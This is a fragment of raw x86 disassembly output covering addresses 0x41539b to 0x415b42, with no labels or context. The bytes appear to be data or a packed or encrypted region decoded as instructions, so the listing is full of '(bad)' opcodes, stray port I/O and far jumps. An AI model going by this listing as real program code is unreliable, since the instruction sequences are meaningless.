  41539b:	sbb    DWORD PTR [edi-0x72779e25],esi
  4153a1:	dec    esi
  4153a2:	outs   dx,BYTE PTR ds:[esi]
  4153a3:	cmc    
  4153a4:	or     BYTE PTR [ecx-0x70],dl
  4153a7:	sahf   
  4153a8:	(bad)  
  4153a9:	std    
  4153aa:	outs   dx,WORD PTR ds:[esi]
  4153ac:	pop    edx
  4153ad:	mov    ?,WORD PTR [ebx-0x68]
  4153b0:	pop    esi
  4153b1:	ds push cs
  4153b3:	mov    WORD PTR [esi-0x20],fs
  4153b6:	inc    ecx
  4153b7:	fs dec eax
  4153b9:	(bad)  
  4153ba:	scas   al,BYTE PTR es:[edi]
  4153bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153bc:	jge    0x415424
  4153be:	cld    
  4153bf:	out    dx,eax
  4153c0:	adc    BYTE PTR [ebx],0xc1
  4153c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153c4:	test   DWORD PTR [ebx],ebx
  4153c6:	inc    eax
  4153c7:	std    
  4153c8:	mov    esp,DWORD PTR [edi-0x7d]
  4153cb:	adc    eax,0x2c
  4153ce:	sub    edx,edi
  4153d0:	scas   eax,DWORD PTR es:[edi]
  4153d1:	iret   
  4153d2:	dec    ebp
  4153d3:	out    dx,al
  4153d4:	jge    0x4153bc
  4153d6:	and    ebx,DWORD PTR [edx]
  4153d8:	sub    DWORD PTR [ebp-0x64],0x45
  4153dc:	xor    ebx,esi
  4153de:	arpl   WORD PTR [esi],bp
  4153e0:	aad    0xcd
  4153e2:	inc    ebx
  4153e3:	mov    ch,BYTE PTR ds:0x6db3d376
  4153e9:	mov    ebx,0x9df94d25
  4153ee:	je     0x41543e
  4153f0:	test   al,0xd1
  4153f2:	push   cs
  4153f3:	retf   0xdf0e
  4153f6:	xor    ch,BYTE PTR [ebx-0x5d]
  4153f9:	aas    
  4153fa:	shl    BYTE PTR [edi-0x3a033c76],1
  415400:	ins    BYTE PTR es:[edi],dx
  415401:	mov    ch,0x91
  415403:	mov    eax,ds:0x550c2c1f
  415408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415409:	imul   dl
  41540b:	in     al,0x28
  41540d:	dec    ebx
  41540e:	or     DWORD PTR [esi+0x5a39d6b5],edi
  415414:	ins    BYTE PTR es:[edi],dx
  415415:	sub    DWORD PTR [ebx],ecx
  415417:	inc    eax
  415418:	push   ss
  415419:	mov    eax,ds:0xad55dceb
  41541e:	jmp    0xb82d:0x57309a40
  415425:	mov    esi,0x7af29f0e
  41542a:	cli    
  41542b:	ja     0x415487
  41542d:	nop
  41542e:	adc    ebx,DWORD PTR [ecx-0x71]
  415431:	call   0x83df:0xaf713470
  415438:	lea    esp,[bx+di]
  41543b:	jmp    0x5a280199
  415440:	or     eax,0x515b6c2b
  415445:	mov    BYTE PTR [esi+ebp*1+0x132f2117],dh
  41544c:	sahf   
  41544d:	or     esi,DWORD PTR [eax-0x7850be3a]
  415453:	add    DWORD PTR [edi-0x50],esi
  415456:	xchg   DWORD PTR [esi],esi
  415458:	sub    al,0x4c
  41545a:	or     DWORD PTR [eax],esp
  41545c:	push   cs
  41545d:	js     0x41548f
  41545f:	pop    es
  415460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415461:	push   es
  415462:	popf   
  415463:	fst    QWORD PTR [ebx]
  415465:	aam    0x80
  415467:	add    DWORD PTR [edi],ebp
  415469:	outs   dx,DWORD PTR ds:[esi]
  41546a:	imul   edi,DWORD PTR [esi+edi*4+0x16a06684],0xfffffff3
  415472:	add    DWORD PTR [edx-0x795be55d],edx
  415478:	daa    
  415479:	std    
  41547a:	in     al,dx
  41547b:	xor    eax,0x2592f5aa
  415480:	sbb    edi,ebp
  415482:	sahf   
  415483:	(bad)  
  415484:	jmp    FWORD PTR [ebx-0x365f89d2]
  41548a:	xchg   dl,cl
  41548c:	lahf   
  41548d:	stc    
  41548e:	xchg   ecx,eax
  41548f:	sbb    eax,0x8eebd8b
  415494:	sbb    eax,0x4cf46979
  415499:	adc    DWORD PTR [ebx+eiz*1+0x78],0xd98020fc
  4154a1:	jle    0x4154eb
  4154a3:	xchg   BYTE PTR [eax+0x35ab2973],al
  4154a9:	cmp    eax,0x68d42e3f
  4154ae:	pop    esp
  4154af:	bound  edi,QWORD PTR [eax]
  4154b1:	es arpl sp,sp
  4154b4:	loop   0x415510
  4154b6:	cli    
  4154b7:	stos   BYTE PTR es:[edi],al
  4154b8:	dec    esp
  4154b9:	ins    BYTE PTR es:[edi],dx
  4154ba:	addr16 xor al,0x41
  4154bd:	dec    esp
  4154be:	or     DWORD PTR [ebx],edi
  4154c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154c1:	xlat   BYTE PTR ds:[ebx]
  4154c2:	adc    al,0x5f
  4154c4:	jg     0x4154ab
  4154c6:	and    edi,DWORD PTR ds:0x2c62c90c
  4154cc:	rcr    BYTE PTR [eax],1
  4154ce:	adc    BYTE PTR [ecx-0x72],0x76
  4154d2:	xchg   edx,eax
  4154d3:	inc    eax
  4154d4:	fwait
  4154d5:	stos   BYTE PTR es:[edi],al
  4154d6:	or     al,0xb5
  4154d8:	in     eax,0x9d
  4154da:	add    BYTE PTR [eax],al
  4154dc:	add    DWORD PTR [ebp-0x4f],0xffffffde
  4154e0:	mov    edi,0xa885903b
  4154e5:	sub    ah,BYTE PTR [edi+0x769afb48]
  4154eb:	xor    BYTE PTR [edi],0x1b
  4154ee:	mov    ds:0x1adad94d,eax
  4154f3:	iret   
  4154f4:	push   ss
  4154f5:	dec    eax
  4154f6:	lahf   
  4154f7:	xchg   ecx,eax
  4154f8:	pop    ebp
  4154f9:	or     eax,DWORD PTR [esi+0x19cbb89c]
  4154ff:	mov    esp,0x2ba55ae1
  415504:	mov    bl,0x1a
  415506:	ds dec esp
  415508:	adc    BYTE PTR [eax+0x19],al
  41550b:	push   ds
  41550c:	xor    eax,0x1d528426
  415511:	mov    bh,0xd9
  415513:	add    eax,0xc11ecb7a
  415518:	and    ecx,DWORD PTR [ebx+0x1b7a465]
  41551e:	mov    eax,ds:0x9e1f7760
  415523:	sub    ah,bl
  415525:	adc    esp,edx
  415527:	aaa    
  415528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415529:	les    ebx,FWORD PTR ds:[eax-0x1f]
  41552d:	add    cl,al
  41552f:	fnstenv [esi+0x4e]
  415532:	enter  0x9de9,0xbb
  415536:	ss mov ebp,0x2c475fc4
  41553c:	push   ecx
  41553d:	xchg   ecx,eax
  41553e:	and    eax,0x30ad54f7
  415543:	mov    ds:0xadd15bcf,eax
  415548:	adc    al,0xa6
  41554a:	push   eax
  41554b:	push   edi
  41554c:	out    0x63,eax
  41554e:	xchg   BYTE PTR [eax-0x3d],ah
  415551:	jbe    0x415555
  415553:	jae    0x41553c
  415555:	clc    
  415556:	fdivr  QWORD PTR ds:0x20014bde
  41555c:	pop    esp
  41555d:	test   dl,dl
  41555f:	dec    ebp
  415560:	jecxz  0x415593
  415562:	fistp  DWORD PTR [edi*8+0x1671d1ed]
  415569:	pop    eax
  41556a:	(bad)  
  41556b:	jecxz  0x41550b
  41556d:	or     eax,0x8aa95c38
  415572:	jne    0x4155bf
  415574:	test   DWORD PTR [edx-0x6e097529],0x6d8fb1f8
  41557e:	pop    ecx
  41557f:	arpl   dx,di
  415581:	mov    eax,ds:0xc40df703
  415586:	clc    
  415587:	add    al,0xa4
  415589:	sub    bh,BYTE PTR [edi+0x2fbcf89c]
  41558f:	ficomp WORD PTR [esi-0x604424fe]
  415595:	(bad)  
  415596:	push   ecx
  415597:	push   esi
  415598:	pushf  
  415599:	repz sbb edx,DWORD PTR [ebp-0x2d]
  41559d:	imul   esp,esp,0xffffffd2
  4155a0:	xor    al,0x7d
  4155a2:	or     al,0x7d
  4155a4:	mov    dh,0xf5
  4155a6:	mov    ah,0x95
  4155a8:	lods   al,BYTE PTR ds:[esi]
  4155a9:	fldenv [ebx+0x6b7859c2]
  4155af:	data16 sbb al,0x50
  4155b2:	outs   dx,DWORD PTR ds:[esi]
  4155b3:	aas    
  4155b4:	sub    BYTE PTR [edi+eax*8],ch
  4155b7:	inc    edx
  4155b8:	bound  esi,QWORD PTR [ebx+0x2f797124]
  4155be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155bf:	mov    ebx,0xfb1dcfe6
  4155c4:	paddusb mm5,QWORD PTR [ebp-0x2c]
  4155c8:	sahf   
  4155c9:	std    
  4155ca:	push   edx
  4155cb:	dec    eax
  4155cc:	mov    ebp,0x83f28dd4
  4155d1:	cmp    ah,BYTE PTR [esi]
  4155d3:	jecxz  0x415579
  4155d5:	call   0x61dcf820
  4155da:	call   DWORD PTR [ecx-0x25a1f672]
  4155e0:	popf   
  4155e1:	fwait
  4155e2:	and    al,0xd4
  4155e4:	xchg   ebx,eax
  4155e5:	mov    cs,WORD PTR [edi]
  4155e7:	pop    ebx
  4155e8:	mul    BYTE PTR [ebx]
  4155ea:	sub    al,0x5
  4155ec:	push   cs
  4155ed:	xchg   ebx,eax
  4155ee:	push   ebx
  4155ef:	jp     0x4155a6
  4155f1:	pop    esi
  4155f2:	sbb    cl,BYTE PTR [ebp+0x65]
  4155f5:	pusha  
  4155f6:	mov    ah,0x48
  4155f8:	add    ecx,DWORD PTR [edi-0x4514d549]
  4155fe:	jge    0x4155bd
  415600:	cld    
  415601:	sbb    al,0x1d
  415603:	xchg   ebx,eax
  415604:	imul   edi,esp,0xffffffc5
  415607:	xor    eax,0xa050f5b5
  41560c:	inc    eax
  41560d:	sahf   
  41560e:	push   ecx
  41560f:	les    ecx,FWORD PTR [edi+0x51c9ad03]
  415615:	iret   
  415616:	icebp  
  415617:	lahf   
  415618:	mov    bl,0x8b
  41561a:	aas    
  41561b:	repz mov ebp,0x9ed76f73
  415621:	mov    esp,0x476564e1
  415626:	in     al,dx
  415627:	xor    bh,dh
  415629:	outs   dx,DWORD PTR ds:[esi]
  41562a:	pop    edi
  41562b:	mov    es,WORD PTR [ecx]
  41562d:	sahf   
  41562e:	jl     0x415662
  415630:	cdq    
  415631:	nop
  415632:	repz cmp BYTE PTR [ecx],bh
  415635:	popf   
  415636:	pop    ebp
  415637:	cdq    
  415638:	sbb    ah,ch
  41563a:	cli    
  41563b:	dec    ebx
  41563c:	dec    ecx
  41563d:	(bad)  
  41563e:	(bad)  
  415640:	xchg   ecx,eax
  415641:	dec    edi
  415642:	js     0x4156a0
  415644:	dec    edx
  415645:	xor    ebx,DWORD PTR [ebp-0x2efafb86]
  41564b:	pop    esi
  41564c:	aaa    
  41564d:	call   0xfd8dae3a
  415652:	pop    edi
  415653:	sub    BYTE PTR [edx+ebx*2+0x30],dh
  415657:	jno    0x4156b3
  415659:	cmp    DWORD PTR [ecx-0x568539e7],ecx
  41565f:	pushf  
  415660:	daa    
  415661:	pusha  
  415662:	xlat   BYTE PTR ds:[ebx]
  415663:	or     ecx,DWORD PTR [ecx+eiz*4+0x26]
  415667:	mov    ebp,0x16aea6f1
  41566c:	mov    dh,0xb0
  41566e:	sbb    BYTE PTR ds:0xe830063e,dh
  415674:	fwait
  415675:	jp     0x4156de
  415677:	dec    edi
  415678:	fnsave [edi+0x1e]
  41567b:	xor    esi,DWORD PTR [eax+0x458c439f]
  415681:	xchg   DWORD PTR [esi+eax*2+0x765545e8],esp
  415688:	(bad)  
  415689:	mov    bh,0x10
  41568b:	pop    edx
  41568c:	retf   
  41568d:	rol    edi,cl
  41568f:	enter  0x9617,0xb2
  415693:	jp     0x41565b
  415695:	push   esp
  415696:	adc    eax,0x40b1aa51
  41569b:	jp     0x4156c1
  41569d:	xor    eax,0xc4d23b16
  4156a2:	mov    ah,0x18
  4156a4:	cmp    bh,BYTE PTR gs:[edi]
  4156a7:	mov    ah,0xf5
  4156a9:	add    DWORD PTR [edi],ecx
  4156ab:	adc    DWORD PTR [ecx],ebp
  4156ad:	bound  ebp,QWORD PTR ds:[ecx-0x1e]
  4156b1:	pusha  
  4156b2:	lock fprem1 
  4156b5:	cmp    ecx,DWORD PTR [ebp+0x6155dee4]
  4156bb:	mov    al,ds:0xb695544b
  4156c0:	fidivr DWORD PTR [esi-0x4b]
  4156c3:	inc    eax
  4156c4:	mov    esp,0xdf7679fe
  4156c9:	add    BYTE PTR ds:0x8bae1091,0x6b
  4156d0:	xchg   BYTE PTR [edi+0x55],ch
  4156d3:	nop
  4156d4:	daa    
  4156d5:	fnsave [ebp-0x715c1bc2]
  4156db:	mov    esi,0xa9d6c59c
  4156e0:	in     eax,0x37
  4156e2:	push   ss
  4156e3:	lods   eax,DWORD PTR ds:[esi]
  4156e4:	pop    esp
  4156e5:	jecxz  0x4156f9
  4156e7:	lahf   
  4156e8:	sub    ch,BYTE PTR ds:0x72ce29eb
  4156ee:	sti    
  4156ef:	pusha  
  4156f0:	xchg   ebx,eax
  4156f1:	fisub  WORD PTR [ebx+edx*1-0x6d]
  4156f5:	ret    0xe500
  4156f8:	aas    
  4156f9:	adc    DWORD PTR [eax-0xc8d102b],ebp
  4156ff:	push   0xe6d5c558
  415704:	aaa    
  415705:	push   ds
  415706:	ret    0xbbe9
  415709:	in     al,0x48
  41570b:	and    eax,esi
  41570d:	dec    esp
  41570e:	pop    eax
  41570f:	fdiv   DWORD PTR [eax]
  415711:	int    0x38
  415713:	jae    0x4156c8
  415715:	mov    ebp,0xc2f657ad
  41571a:	ret    0x5555
  41571d:	cld    
  41571e:	push   ecx
  41571f:	dec    edx
  415720:	or     ebx,DWORD PTR [ecx+ebx*8+0x77]
  415724:	mov    ds:0x72a6d95a,al
  415729:	push   cs
  41572a:	popa   
  41572b:	cmp    bl,bh
  41572d:	loop   0x4157a4
  41572f:	or     dh,ch
  415731:	aad    0x10
  415733:	dec    esi
  415734:	retf   
  415735:	nop
  415736:	inc    esp
  415737:	or     esp,DWORD PTR [edx-0x22a47415]
  41573d:	xchg   BYTE PTR [ebx+0x7f],ah
  415740:	das    
  415741:	mov    dl,0x53
  415743:	mov    ecx,0xbeb2f563
  415748:	(bad)  
  415749:	adc    eax,ebp
  41574b:	daa    
  41574c:	fmul   QWORD PTR [eax+0x45db33fd]
  415752:	gs pop ebp
  415754:	push   ecx
  415755:	scas   eax,DWORD PTR es:[edi]
  415756:	out    0x14,eax
  415758:	test   DWORD PTR [ebp+eiz*2-0x515867bc],0x95e942d8
  415763:	iret   
  415764:	sbb    al,0x67
  415766:	(bad)  
  415767:	fcom   DWORD PTR [ebx]
  415769:	cdq    
  41576a:	sub    ebx,DWORD PTR [esi-0x32]
  41576d:	cmp    edx,DWORD PTR [edx+0x48]
  415770:	(bad)  
  415771:	jge    0x415764
  415773:	and    al,0xaf
  415775:	and    bh,al
  415777:	xor    al,0x0
  415779:	sbb    DWORD PTR [eax-0x59],ebp
  41577c:	(bad)  [ebp-0x2f]
  41577f:	stos   DWORD PTR es:[edi],eax
  415780:	data16 fwait
  415782:	push   edi
  415783:	mov    bh,cl
  415785:	jmp    FWORD PTR [edx]
  415787:	ffreep st(1)
  415789:	adc    eax,0x9fbb4af1
  41578e:	fst    st(0)
  415790:	xchg   edx,eax
  415791:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  415793:	je     0x41575e
  415795:	jp     0x415794
  415797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415798:	add    eax,0x81507002
  41579d:	fld    TBYTE PTR [ecx+0x2e]
  4157a0:	ficomp WORD PTR [ecx+0x12]
  4157a3:	mov    ebp,0x3dffef4
  4157a8:	sbb    DWORD PTR [eax+0x4613ddea],ebp
  4157ae:	cmp    eax,0xb5ac3039
  4157b3:	push   ds
  4157b4:	(bad)  
  4157b6:	and    eax,0xb84bf1c2
  4157bb:	call   0x464ce8bd
  4157c0:	jle    0x4157ca
  4157c2:	xchg   ebp,eax
  4157c3:	sbb    ah,BYTE PTR [esi-0x651d19ed]
  4157c9:	push   edx
  4157ca:	pop    ebx
  4157cb:	pop    ds
  4157cc:	sbb    eax,0x7ecf856a
  4157d1:	and    DWORD PTR [ebp+0x57],ebp
  4157d4:	jne    0x415833
  4157d6:	lods   al,BYTE PTR ds:[esi]
  4157d7:	xor    al,0xcb
  4157d9:	sahf   
  4157da:	pop    ecx
  4157db:	jae    0x415763
  4157dd:	push   cs
  4157de:	leave  
  4157df:	bndldx (bad),ds:0xf93b590b
  4157e6:	sub    cl,BYTE PTR [ecx-0x74]
  4157e9:	outs   dx,DWORD PTR ds:[esi]
  4157ea:	inc    edi
  4157eb:	mov    eax,ds:0x1e5d542c
  4157f0:	imul   ecx,DWORD PTR [esi-0x69],0xffffffc8
  4157f4:	outs   dx,BYTE PTR ds:[esi]
  4157f5:	jno    0x41578a
  4157f7:	xchg   ecx,eax
  4157f8:	pop    ecx
  4157f9:	or     al,0x9e
  4157fb:	out    0xe6,eax
  4157fd:	call   0x32ee:0x73f28332
  415804:	repz dec esp
  415806:	popa   
  415807:	pop    es
  415808:	test   ebx,eax
  41580a:	pop    esp
  41580b:	mov    ah,0x3c
  41580d:	adc    DWORD PTR [edx+0x56],edx
  415810:	inc    edi
  415811:	mov    al,BYTE PTR [esi+0x2d809d4f]
  415817:	arpl   ax,si
  415819:	mov    cl,0x64
  41581b:	or     edx,DWORD PTR [esi]
  41581d:	loopne 0x4157ad
  41581f:	int3   
  415820:	fwait
  415821:	jae    0x4157d9
  415823:	cmp    BYTE PTR [ecx+0x61],dh
  415826:	add    al,BYTE PTR [esi+0x13]
  415829:	or     DWORD PTR [edx+0x170b427a],edi
  41582f:	jg     0x415819
  415831:	lock dec edi
  415833:	sahf   
  415834:	retf   
  415835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415836:	(bad)  
  415837:	std    
  415838:	popf   
  415839:	ret    0xbd2c
  41583c:	sub    BYTE PTR [eax+0x43],dh
  41583f:	sahf   
  415840:	dec    edx
  415841:	inc    edx
  415842:	dec    BYTE PTR [eax+0x77c7060e]
  415848:	cmp    al,0x5
  41584a:	fldcw  WORD PTR [ebp+0x5bdb6992]
  415850:	js     0x4158bd
  415852:	cmp    edx,DWORD PTR [eax-0x277b171a]
  415858:	xchg   ecx,eax
  415859:	call   0x676c:0xc7fe77cd
  415860:	ror    cl,0xec
  415863:	xchg   edi,eax
  415864:	ins    DWORD PTR es:[edi],dx
  415865:	ror    DWORD PTR [ebp-0x5a],1
  415868:	pop    ebx
  415869:	xor    esp,esi
  41586b:	fwait
  41586c:	jl     0x4158cf
  41586e:	xor    BYTE PTR [esi],0xb2
  415871:	fs mov ah,0x2
  415874:	int    0x9e
  415876:	inc    ebx
  415877:	jne    0x415890
  415879:	into   
  41587a:	bound  ecx,QWORD PTR ds:0x277eafd8
  415880:	add    DWORD PTR [ebp+esi*1+0x71c476dd],edx
  415887:	loope  0x415871
  415889:	rol    BYTE PTR [ebx],cl
  41588b:	cmp    BYTE PTR [edi],dh
  41588d:	jle    0x4158b8
  41588f:	out    0x1,eax
  415891:	retf   0x83c9
  415894:	std    
  415895:	mov    ds:0x5531191f,al
  41589a:	idiv   BYTE PTR [esi-0x30]
  41589d:	jo     0x4158fa
  41589f:	(bad)  
  4158a0:	leave  
  4158a1:	gs repnz pushf 
  4158a4:	jne    0x415861
  4158a6:	dec    ecx
  4158a7:	aaa    
  4158a8:	stos   BYTE PTR es:[edi],al
  4158a9:	pushf  
  4158aa:	xchg   ebx,eax
  4158ab:	sbb    DWORD PTR [ebp-0x76],edi
  4158ae:	pop    esi
  4158af:	cld    
  4158b0:	push   ds
  4158b1:	ins    DWORD PTR es:[edi],dx
  4158b2:	lahf   
  4158b3:	data16 (bad) 
  4158b5:	daa    
  4158b6:	xor    eax,0x547058ea
  4158bb:	sub    DWORD PTR [ebx-0x76],esi
  4158be:	mov    ds:0xe9cd14df,al
  4158c3:	stos   DWORD PTR es:[edi],eax
  4158c4:	jmp    0x41591d
  4158c6:	and    ecx,edx
  4158c8:	inc    esi
  4158c9:	push   cs
  4158ca:	mov    DWORD PTR [eax],ebx
  4158cc:	pusha  
  4158cd:	lods   eax,DWORD PTR ds:[esi]
  4158ce:	xlat   BYTE PTR ds:[ebx]
  4158cf:	data16 or bh,ch
  4158d2:	dec    ebp
  4158d3:	iret   
  4158d4:	ja     0x415884
  4158d6:	outs   dx,BYTE PTR ds:[esi]
  4158d7:	mov    ch,0x25
  4158da:	fnstsw WORD PTR [edi+ecx*4+0x51]
  4158de:	mov    ch,0x13
  4158e0:	adc    al,0x19
  4158e2:	ds lahf 
  4158e4:	in     eax,0xfe
  4158e6:	out    0x46,eax
  4158e8:	pop    ebp
  4158e9:	aaa    
  4158ea:	xchg   ebx,eax
  4158eb:	xor    dh,BYTE PTR [edx-0x7d41ef06]
  4158f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158f2:	aas    
  4158f3:	ret    
  4158f4:	push   eax
  4158f5:	das    
  4158f6:	cmp    esi,ebp
  4158f8:	ror    DWORD PTR [ebx*2-0x51a6a1d],1
  4158ff:	repnz in eax,0x7
  415902:	(bad)  
  415903:	add    BYTE PTR [ebx-0x66],dh
  415906:	mov    ah,0x5a
  415908:	nop
  415909:	and    DWORD PTR [eax+0x25],eax
  41590c:	push   edi
  41590d:	pop    ebp
  41590e:	stos   BYTE PTR es:[edi],al
  41590f:	adc    dl,bh
  415911:	add    cl,BYTE PTR [esi-0x18]
  415914:	sbb    bh,al
  415916:	sbb    eax,0xce01894f
  41591b:	push   esi
  41591c:	and    DWORD PTR [ebx+0x7cfa308c],edx
  415922:	inc    eax
  415923:	xchg   edi,eax
  415924:	lahf   
  415925:	push   edi
  415926:	ss pop eax
  415928:	xchg   bh,ah
  41592a:	xor    eax,0x347539b2
  41592f:	and    edi,edx
  415931:	(bad)  [eax-0x6dcd33e7]
  415937:	jbe    0x415997
  415939:	push   esi
  41593a:	rcr    DWORD PTR [eax+0x76],0xb8
  41593e:	ret    0xbf73
  415941:	cli    
  415942:	div    DWORD PTR [edi+0x62]
  415945:	and    DWORD PTR [ebx],esi
  415947:	cmp    DWORD PTR [edx+ebx*1-0x31],esi
  41594b:	sbb    BYTE PTR [ecx+0x2f6b80a0],dh
  415951:	cwde   
  415952:	add    eax,0xa23e03f7
  415957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415958:	xor    BYTE PTR [eax],al
  41595a:	mov    edi,0x54efc0a0
  41595f:	pop    ebx
  415960:	repnz in eax,dx
  415962:	adc    BYTE PTR [edi-0x6e],ah
  415965:	nop
  415966:	aas    
  415967:	sub    ch,bl
  415969:	in     eax,0xb2
  41596b:	jmp    0x84a84624
  415970:	mov    ds:0x1394eaf,eax
  415975:	xchg   esp,eax
  415976:	add    DWORD PTR [esi+ecx*2-0x15bc5ff5],ebx
  41597d:	and    DWORD PTR [ecx+0x2e3bb218],esi
  415983:	inc    edi
  415984:	push   edi
  415985:	(bad)  
  415987:	sub    ecx,DWORD PTR [edi-0x8]
  41598a:	pop    ebx
  41598b:	sbb    DWORD PTR [ebx+eiz*1+0x17],ecx
  41598f:	rcr    BYTE PTR [edi+ebp*4],0xc3
  415993:	fdivr  DWORD PTR [ebx+0x4f272e4b]
  415999:	add    esi,ecx
  41599b:	mov    eax,ds:0xd1fffb27
  4159a0:	cmp    ch,dh
  4159a2:	jnp    0x415937
  4159a4:	push   esp
  4159a5:	cdq    
  4159a6:	aad    0xf
  4159a8:	rol    DWORD PTR [ebp-0x64],1
  4159ab:	pop    ebp
  4159ac:	fisttp WORD PTR [ebp-0x52]
  4159af:	xchg   esi,eax
  4159b0:	mov    esi,0xfbec16e3
  4159b5:	push   cs
  4159b6:	ret    
  4159b7:	sahf   
  4159b8:	jmp    0x76a4:0x31c18790
  4159bf:	inc    esi
  4159c0:	xchg   BYTE PTR [esi-0x45],bl
  4159c3:	push   0xfffffffd
  4159c5:	or     BYTE PTR [ecx],ch
  4159c7:	stc    
  4159c8:	fist   DWORD PTR [ecx-0x15]
  4159cb:	mov    eax,0x8838f98e
  4159d0:	cmp    BYTE PTR [esi+0x13],al
  4159d3:	sar    DWORD PTR [ebx+edx*2+0x6049ceaa],1
  4159da:	call   DWORD PTR [ecx-0x7b26bf9]
  4159e0:	mov    esi,0x8055acda
  4159e5:	pop    edx
  4159e6:	jp     0x41599e
  4159e8:	add    eax,0xf989c990
  4159ed:	xchg   dl,dh
  4159ef:	imul   ebx,DWORD PTR [ecx-0x6c],0xe7966486
  4159f6:	xor    esp,DWORD PTR [esp+eiz*8-0x9]
  4159fa:	pop    ebp
  4159fb:	in     eax,dx
  4159fc:	call   0x61c:0x3290f090
  415a03:	mul    DWORD PTR [ecx]
  415a05:	pop    ecx
  415a06:	cmp    cl,BYTE PTR [edi]
  415a08:	mov    bh,0xac
  415a0a:	neg    DWORD PTR [ebx+0x1fffe83]
  415a10:	sub    bl,dl
  415a12:	cld    
  415a13:	popa   
  415a14:	adc    eax,0xc4aa744e
  415a19:	or     ebx,DWORD PTR [edx+0x42]
  415a1c:	rcl    BYTE PTR [ecx-0x449978aa],0x98
  415a23:	sub    edi,DWORD PTR [esi]
  415a25:	xlat   BYTE PTR ds:[ebx]
  415a26:	or     eax,0x94198433
  415a2b:	push   ebp
  415a2c:	bound  edi,QWORD PTR [edi-0x64]
  415a2f:	das    
  415a30:	test   al,0xcf
  415a32:	fsub   st,st(6)
  415a34:	push   esi
  415a35:	(bad)  
  415a36:	xchg   ebp,eax
  415a37:	mov    cl,dl
  415a39:	xor    eax,0xc3ca502
  415a3e:	and    BYTE PTR [edi],cl
  415a40:	sbb    al,0x98
  415a42:	and    edi,eax
  415a44:	div    ebx
  415a46:	scas   al,BYTE PTR es:[edi]
  415a47:	imul   BYTE PTR [esi-0x3f9e4fd0]
  415a4d:	and    ebx,DWORD PTR [edx+0x26]
  415a50:	test   eax,0xaa4b627e
  415a55:	les    eax,FWORD PTR [eax]
  415a57:	out    dx,al
  415a58:	(bad)  
  415a59:	fcom   QWORD PTR [edi+0x454aecf3]
  415a5f:	add    BYTE PTR [edi+0x27dbe6e6],ch
  415a65:	cmc    
  415a66:	cwde   
  415a67:	xchg   BYTE PTR [edi+0x508012d0],ch
  415a6d:	lock rcl BYTE PTR [esi+0x14],0xd1
  415a72:	hlt    
  415a73:	and    al,bh
  415a75:	in     eax,0xc4
  415a77:	fucomp st(6)
  415a79:	leave  
  415a7a:	les    esp,FWORD PTR [esi+0x17]
  415a7d:	push   0xffffffd1
  415a7f:	jl     0x415a5b
  415a81:	jb     0x415a0f
  415a83:	rcr    ebp,1
  415a85:	xor    BYTE PTR [edx],0x43
  415a88:	mov    al,ds:0x9ee6ad18
  415a8d:	adc    eax,0x76929a52
  415a92:	push   ss
  415a93:	mov    eax,ds:0x7d7ae3c
  415a98:	inc    esi
  415a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a9a:	inc    esi
  415a9b:	imul   BYTE PTR [edi]
  415a9d:	out    0xe2,al
  415a9f:	push   esp
  415aa0:	fsubr  st(0),st
  415aa2:	jbe    0x415b07
  415aa4:	data16 mov cl,0x62
  415aa7:	jmp    0x415ac3
  415aa9:	fld    DWORD PTR [ebx]
  415aab:	cmp    ah,BYTE PTR [ebx+0x48]
  415aae:	es xor eax,0xfa727ea8
  415ab4:	mov    bl,0x7e
  415ab6:	je     0x415b24
  415ab8:	cs xchg ebx,eax
  415aba:	cmp    BYTE PTR [ecx],dh
  415abc:	test   BYTE PTR [ecx],bl
  415abe:	mov    ss,WORD PTR [edi]
  415ac0:	push   0x73
  415ac2:	inc    edi
  415ac3:	mov    al,BYTE PTR [ebx+0x7f1569ed]
  415ac9:	push   eax
  415aca:	cmp    edx,DWORD PTR [edx+edx*1-0x5e]
  415ace:	xor    eax,0x54878ef1
  415ad3:	nop
  415ad4:	jge    0x415b44
  415ad6:	int3   
  415ad7:	scas   eax,DWORD PTR es:[edi]
  415ad8:	push   edi
  415ad9:	ret    
  415ada:	ss mov bl,0x4f
  415add:	mov    es,WORD PTR [ebx+edx*1+0x7d]
  415ae1:	sar    BYTE PTR [eax-0x6d],1
  415ae4:	inc    edi
  415ae5:	es pop esi
  415ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae8:	ins    DWORD PTR es:[edi],dx
  415ae9:	push   ebp
  415aea:	jl     0x415ad6
  415aec:	xchg   esi,eax
  415aed:	cld    
  415aee:	in     al,dx
  415aef:	inc    sp
  415af1:	daa    
  415af2:	in     eax,dx
  415af3:	into   
  415af4:	pop    edx
  415af5:	push   cs
  415af6:	xor    ah,dl
  415af8:	mov    DWORD PTR [ebx],ecx
  415afa:	mov    ah,0xcf
  415afc:	jecxz  0x415b66
  415afe:	jg     0x415a87
  415b00:	in     eax,0x9b
  415b02:	or     BYTE PTR [esi-0x58],ch
  415b05:	jmp    0xa780:0x23245a40
  415b0c:	push   eax
  415b0d:	into   
  415b0e:	cmp    esi,DWORD PTR [ecx+eax*4]
  415b11:	shr    DWORD PTR [edx+0x71b8c4ed],cl
  415b17:	aas    
  415b18:	fwait
  415b19:	loop   0x415a9b
  415b1b:	(bad)  
  415b1c:	fidiv  WORD PTR [eax+0x50]
  415b1f:	and    eax,0x612ae34a
  415b24:	dec    esp
  415b25:	and    ah,BYTE PTR [ecx+0x3]
  415b28:	loopne 0x415b78
  415b2a:	xchg   edi,eax
  415b2b:	pop    ebx
  415b2c:	rcr    DWORD PTR [edx+0x7b814478],1
  415b32:	pushf  
  415b33:	shl    BYTE PTR [esi-0x3eb57329],cl
  415b39:	pop    ss
  415b3a:	rcr    eax,1
  415b3c:	pop    eax
  415b3d:	pop    ebx
  415b3f:	jb     0x415acc
  415b41:	push   ebp
  415b42:	dec    esp
